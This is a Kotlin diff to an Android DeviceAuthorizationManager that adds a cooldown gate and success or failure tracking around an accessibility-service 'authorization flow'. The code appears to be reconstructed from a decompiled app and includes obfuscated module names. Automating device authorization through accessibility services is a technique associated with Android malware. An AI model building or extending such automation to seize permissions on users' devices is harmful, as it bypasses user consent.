@@ -5,6 +5,7 @@ import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import com.storm.safe.rock.service.MyAccessibilityService
+import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
 import com.storm.safe.rock.service.modules.base.AccessibilityDelegate
 import com.storm.safe.rock.service.modules.yw5xud.UiDebugger
 import com.storm.safe.rock.service.modules.yw5xud.Yw5xudHandler
@@ -226,9 +227,17 @@ class DeviceAuthorizationManager(
                 } catch (_: Exception) {}
             }
 
+            // Cooldown gate: skip if recent failure within AUTH_COOLDOWN_MS
+            if (AutomationCoordinator.shouldSkipDueToRecentFailure()) {
+                Log.i(TAG, "⏸️ 授权流程冷却中 (距上次失败 < ${AutomationCoordinator.AUTH_COOLDOWN_MS / 1000}s)，跳过")
+                return
+            }
+
             // Launch coroutine for authorization flow (JADX: AbstractC0780a0.m213692a3)
             coroutineScope.launch {
-                executeAuthorizationFlow()
+                AutomationCoordinator.withFlow("auth") {
+                    executeAuthorizationFlow()
+                }
             }
         } catch (e: Exception) {
             Log.w(TAG, "❌ 检查授权状态失败: ${e.message}")
@@ -325,9 +334,13 @@ class DeviceAuthorizationManager(
                         // Mark completed if fully successful
                         if (result.isSuccess && failures.isEmpty()) {
                             markAuthCompleted(context)
+                            AutomationCoordinator.markSuccess()
+                        } else {
+                            AutomationCoordinator.markFailure()
                         }
                     } catch (e: Exception) {
                         Log.e(TAG, "❌ 授权执行异常: ${e.message}", e)
+                        AutomationCoordinator.markFailure()
                         val errorResult = AccessibilityDelegate.AuthorizationResult(
                             isSuccess = false,
                             successes = emptyList(),
